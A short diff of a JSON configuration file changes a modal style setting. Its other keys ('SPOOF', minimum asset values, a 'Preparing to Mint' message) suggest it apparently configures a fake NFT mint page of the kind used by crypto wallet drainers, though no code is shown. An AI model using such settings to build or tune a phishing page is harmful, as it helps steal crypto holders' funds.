@@ -3,7 +3,7 @@
   "SPOOF": "3",
   "ASSET_MIN": "10",
   "TOTAL_MIN": "10",
-  "MODAL_STYLE": "3",
+  "MODAL_STYLE": "0",
   "DARK_MODE": true,
   "LOADING_MESSAGE": "Preparing to Mint",
   "CONFIRM_MESSAGE": "Please confirm the transaction",
